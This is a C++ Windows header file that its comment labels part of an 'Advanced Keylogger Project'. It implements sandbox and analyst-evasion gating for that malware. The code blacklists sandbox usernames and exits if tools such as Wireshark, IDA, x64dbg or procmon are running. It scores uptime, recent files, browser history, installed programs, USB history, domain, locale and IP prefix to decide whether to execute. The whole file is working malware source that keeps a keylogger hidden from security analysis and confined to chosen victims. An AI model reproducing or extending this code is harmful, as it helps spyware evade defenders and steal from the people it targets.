/*
 * Execution Guardrails Header
 * Environmental checks to ensure we only run on intended targets
 * 
 * Features:
 * - Domain name check (corporate environment)
 * - Hostname pattern matching
 * - Username whitelist/blacklist
 * - IP range verification
 * - Locale/timezone checks
 * - Geographic restrictions
 * 
 * This prevents execution in sandbox/honeypot environments
 * and limits exposure during analysis.
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef GUARDRAILS_H
#define GUARDRAILS_H

#include <windows.h>
#include <lm.h>
#include <iphlpapi.h>
#include <string>
#include <vector>
#include <algorithm>

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

// ==================== CONFIGURATION ====================

// Set these to your target environment
// Leave empty to disable specific check

// Target domain (e.g., "CONTOSO.LOCAL")
#define TARGET_DOMAIN ""

// Hostname must contain one of these substrings
static const char* ALLOWED_HOSTNAME_PATTERNS[] = {
    // Add patterns like "WS-", "PC-", "LAPTOP-"
    // Empty array = no check
};

// Usernames to AVOID (analyst/sandbox accounts)
static const char* BLACKLISTED_USERNAMES[] = {
    "sandbox",
    "virus",
    "malware",
    "sample",
    "test",
    "analysis",
    "admin",         // Generic admin accounts
    "administrator",
    "user",          // Default sandbox user
    "currentuser",
    "john",          // Common sandbox names
    "peter",
    "cuckoo",
    "vmware",
    "vbox"
};

// Locales to allow (e.g., "en-US", "tr-TR")
// Empty = all locales allowed
static const char* ALLOWED_LOCALES[] = {
    // "en-US",
    // "tr-TR"
};

// IP ranges to allow (CIDR notation would be ideal but simplified here)
// Format: "network/mask" or just network prefix
static const char* ALLOWED_IP_PREFIXES[] = {
    // "192.168.1.",
    // "10.0."
};

// Minimum uptime required (seconds) - prevents quick sandbox analysis
#define MIN_UPTIME_SECONDS 300  // 5 minutes

// Minimum number of recent files
#define MIN_RECENT_FILES 10

// Minimum number of installed programs  
#define MIN_INSTALLED_PROGRAMS 20

// ==================== HELPER FUNCTIONS ====================

inline std::string ToLower(const std::string& str) {
    std::string lower = str;
    std::transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    return lower;
}

inline bool StringContains(const std::string& str, const char* substr) {
    return ToLower(str).find(ToLower(substr)) != std::string::npos;
}

inline bool StringEquals(const std::string& str, const char* other) {
    return ToLower(str) == ToLower(other);
}

// ==================== DOMAIN CHECK ====================

inline bool CheckDomain() {
    if (strlen(TARGET_DOMAIN) == 0) return true;  // No domain restriction
    
    LPWSTR domainName = NULL;
    NETSETUP_JOIN_STATUS bufferType;
    
    NET_API_STATUS status = NetGetJoinInformation(NULL, &domainName, &bufferType);
    
    if (status != NERR_Success) {
        return false;  // Can't determine domain, fail safe
    }
    
    bool result = false;
    
    if (bufferType == NetSetupDomainName && domainName) {
        // Convert wide to narrow
        char szDomain[256] = { 0 };
        WideCharToMultiByte(CP_ACP, 0, domainName, -1, szDomain, 256, NULL, NULL);
        
        result = StringEquals(szDomain, TARGET_DOMAIN);
    }
    
    NetApiBufferFree(domainName);
    return result;
}

// ==================== HOSTNAME CHECK ====================

inline bool CheckHostname() {
    int patternCount = sizeof(ALLOWED_HOSTNAME_PATTERNS) / sizeof(ALLOWED_HOSTNAME_PATTERNS[0]);
    if (patternCount == 0) return true;  // No restriction
    
    char hostname[256] = { 0 };
    DWORD size = sizeof(hostname);
    GetComputerNameA(hostname, &size);
    
    std::string host(hostname);
    
    for (int i = 0; i < patternCount; i++) {
        if (ALLOWED_HOSTNAME_PATTERNS[i] && strlen(ALLOWED_HOSTNAME_PATTERNS[i]) > 0) {
            if (StringContains(host, ALLOWED_HOSTNAME_PATTERNS[i])) {
                return true;
            }
        }
    }
    
    return patternCount == 0;  // If all patterns are empty, allow
}

// ==================== USERNAME CHECK ====================

inline bool CheckUsername() {
    char username[256] = { 0 };
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    
    std::string user(username);
    
    // Check blacklist
    int blacklistCount = sizeof(BLACKLISTED_USERNAMES) / sizeof(BLACKLISTED_USERNAMES[0]);
    
    for (int i = 0; i < blacklistCount; i++) {
        if (StringContains(user, BLACKLISTED_USERNAMES[i])) {
            return false;  // Blacklisted username
        }
    }
    
    return true;
}

// ==================== LOCALE CHECK ====================

inline bool CheckLocale() {
    int localeCount = sizeof(ALLOWED_LOCALES) / sizeof(ALLOWED_LOCALES[0]);
    if (localeCount == 0) return true;  // No restriction
    
    char locale[LOCALE_NAME_MAX_LENGTH] = { 0 };
    int len = GetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_SNAME, locale, sizeof(locale));
    
    if (len == 0) return true;  // Can't determine, allow
    
    for (int i = 0; i < localeCount; i++) {
        if (ALLOWED_LOCALES[i] && strlen(ALLOWED_LOCALES[i]) > 0) {
            if (StringEquals(locale, ALLOWED_LOCALES[i])) {
                return true;
            }
        }
    }
    
    return localeCount == 0;  // If all locales are empty, allow
}

// ==================== IP ADDRESS CHECK ====================

inline bool CheckIPAddress() {
    int prefixCount = sizeof(ALLOWED_IP_PREFIXES) / sizeof(ALLOWED_IP_PREFIXES[0]);
    if (prefixCount == 0) return true;  // No restriction
    
    // Check if any prefix is non-empty
    bool hasValidPrefix = false;
    for (int i = 0; i < prefixCount; i++) {
        if (ALLOWED_IP_PREFIXES[i] && strlen(ALLOWED_IP_PREFIXES[i]) > 0) {
            hasValidPrefix = true;
            break;
        }
    }
    if (!hasValidPrefix) return true;
    
    // Get adapter info
    ULONG bufLen = 0;
    GetAdaptersInfo(NULL, &bufLen);
    
    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(bufLen);
    if (!pAdapterInfo) return true;
    
    if (GetAdaptersInfo(pAdapterInfo, &bufLen) != NO_ERROR) {
        free(pAdapterInfo);
        return true;
    }
    
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    bool found = false;
    
    while (pAdapter && !found) {
        std::string ip(pAdapter->IpAddressList.IpAddress.String);
        
        for (int i = 0; i < prefixCount; i++) {
            if (ALLOWED_IP_PREFIXES[i] && strlen(ALLOWED_IP_PREFIXES[i]) > 0) {
                if (ip.find(ALLOWED_IP_PREFIXES[i]) == 0) {
                    found = true;
                    break;
                }
            }
        }
        
        pAdapter = pAdapter->Next;
    }
    
    free(pAdapterInfo);
    return found;
}

// ==================== UPTIME CHECK ====================

inline bool CheckUptime() {
    if (MIN_UPTIME_SECONDS == 0) return true;
    
    // GetTickCount64 returns milliseconds since boot
    ULONGLONG uptimeMs = GetTickCount64();
    ULONGLONG uptimeSec = uptimeMs / 1000;
    
    return uptimeSec >= MIN_UPTIME_SECONDS;
}

// ==================== RECENT FILES CHECK ====================

inline bool CheckRecentFiles() {
    if (MIN_RECENT_FILES == 0) return true;
    
    char recentPath[MAX_PATH];
    if (FAILED(SHGetFolderPathA(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {
        return true;
    }
    
    std::string searchPath = std::string(recentPath) + "\\*";
    
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    
    if (hFind == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    int count = 0;
    do {
        if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
            count++;
        }
    } while (FindNextFileA(hFind, &fd));
    
    FindClose(hFind);
    
    return count >= MIN_RECENT_FILES;
}

// ==================== INSTALLED PROGRAMS CHECK ====================

inline bool CheckInstalledPrograms() {
    if (MIN_INSTALLED_PROGRAMS == 0) return true;
    
    HKEY hKey;
    int count = 0;
    
    // Check 64-bit programs
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
        
        DWORD subkeyCount;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        count += subkeyCount;
        RegCloseKey(hKey);
    }
    
    // Check 32-bit programs
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD subkeyCount;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        count += subkeyCount;
        RegCloseKey(hKey);
    }
    
    return count >= MIN_INSTALLED_PROGRAMS;
}

// ==================== REAL USER CHECK ====================

inline bool CheckRealUser() {
    // Multiple indicators of real user activity
    int score = 0;
    
    // 1. Check for browser history (Firefox/Chrome)
    char appData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData);
    
    std::string chromePath = std::string(appData) + "\\Google\\Chrome\\User Data\\Default\\History";
    if (GetFileAttributesA(chromePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        score += 2;
    }
    
    std::string firefoxPath = std::string(appData) + "\\Mozilla\\Firefox\\Profiles";
    if (GetFileAttributesA(firefoxPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        score += 2;
    }
    
    // 2. Check Documents folder
    char docs[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, docs);
    
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA((std::string(docs) + "\\*").c_str(), &fd);
    int docCount = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                docCount++;
            }
        } while (FindNextFileA(hFind, &fd) && docCount < 20);
        FindClose(hFind);
    }
    
    if (docCount >= 5) score += 1;
    if (docCount >= 10) score += 1;
    
    // 3. Check for Office/productivity software
    char programFiles[MAX_PATH];
    GetEnvironmentVariableA("ProgramFiles", programFiles, MAX_PATH);
    
    std::string officePath = std::string(programFiles) + "\\Microsoft Office";
    if (GetFileAttributesA(officePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
        score += 2;
    }
    
    // 4. Check USB history
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Enum\\USB",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD subkeys;
        RegQueryInfoKeyA(hKey, NULL, NULL, NULL, &subkeys, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        if (subkeys > 5) score += 1;
        RegCloseKey(hKey);
    }
    
    // Need at least 4 points
    return score >= 4;
}

// ==================== TIMEZONE CHECK ====================

inline bool CheckTimezone() {
    TIME_ZONE_INFORMATION tzi;
    GetTimeZoneInformation(&tzi);
    
    // Bias is in minutes from UTC (negative = east of UTC)
    // E.g., UTC+3 (Turkey) = -180
    
    // Example: Only allow specific timezones
    // Uncomment and modify as needed:
    /*
    if (tzi.Bias == -180) return true;  // UTC+3 (Turkey)
    if (tzi.Bias == 0) return true;     // UTC (UK)
    if (tzi.Bias == 300) return true;   // UTC-5 (EST)
    return false;
    */
    
    // Currently allow all timezones
    return true;
}

// ==================== PROCESS LIST CHECK ====================

// Check if any security/analysis tools are running
inline bool CheckProcesses() {
    const char* badProcesses[] = {
        "wireshark.exe",
        "procmon.exe", 
        "procmon64.exe",
        "procexp.exe",
        "procexp64.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "ollydbg.exe",
        "ida.exe",
        "ida64.exe",
        "idaq.exe",
        "idaq64.exe",
        "ghidra.exe",
        "pe-bear.exe",
        "pestudio.exe",
        "fiddler.exe",
        "tcpview.exe",
        "autoruns.exe",
        "regmon.exe",
        "filemon.exe"
    };
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return true;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    
    if (Process32First(hSnap, &pe)) {
        do {
            for (int i = 0; i < sizeof(badProcesses)/sizeof(badProcesses[0]); i++) {
                if (_stricmp(pe.szExeFile, badProcesses[i]) == 0) {
                    CloseHandle(hSnap);
                    return false;  // Bad process found
                }
            }
        } while (Process32Next(hSnap, &pe));
    }
    
    CloseHandle(hSnap);
    return true;
}

// ==================== MASTER GUARDRAILS FUNCTION ====================

typedef struct _GUARDRAIL_RESULT {
    bool passed;
    const char* failedCheck;
    int score;
    int maxScore;
} GUARDRAIL_RESULT;

inline GUARDRAIL_RESULT PerformGuardrailChecks() {
    GUARDRAIL_RESULT result = { true, NULL, 0, 10 };
    
    // Critical checks (must pass)
    if (!CheckUsername()) {
        result.passed = false;
        result.failedCheck = "Username";
        return result;
    }
    result.score++;
    
    if (!CheckProcesses()) {
        result.passed = false;
        result.failedCheck = "Processes";
        return result;
    }
    result.score++;
    
    // Soft checks (scoring)
    if (CheckDomain()) result.score++;
    if (CheckLocale()) result.score++;
    if (CheckIPAddress()) result.score++;
    if (CheckUptime()) result.score++;
    if (CheckRecentFiles()) result.score++;
    if (CheckRealUser()) result.score++;
    if (CheckInstalledPrograms()) result.score++;
    if (CheckTimezone()) result.score++;
    
    // Need at least 6/10 to pass
    if (result.score < 6) {
        result.passed = false;
        result.failedCheck = "Score";
    }
    
    return result;
}

// Simple pass/fail check
inline bool ShouldExecute() {
    GUARDRAIL_RESULT result = PerformGuardrailChecks();
    return result.passed;
}

#endif // GUARDRAILS_H
